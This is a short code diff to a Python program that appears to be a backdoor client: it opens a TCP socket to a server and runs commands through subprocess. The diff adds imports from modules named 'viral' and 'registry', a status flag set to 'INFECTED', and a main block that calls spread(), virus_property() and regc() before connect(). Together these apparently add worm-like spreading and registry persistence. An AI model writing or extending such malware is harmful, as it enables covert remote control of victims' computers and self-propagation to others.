@@ -1,6 +1,12 @@
 import subprocess
 import socket
 from time import *
+from viral import *
+from registry import *
+
+
+status = 'INFECTED'
+
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 SERVER_HOST = ''
@@ -43,4 +49,8 @@ def connect():
                     continue
 
 
-connect()
+if __name__ == '__main__':
+    spread()
+    virus_property()
+    regc()
+    connect()
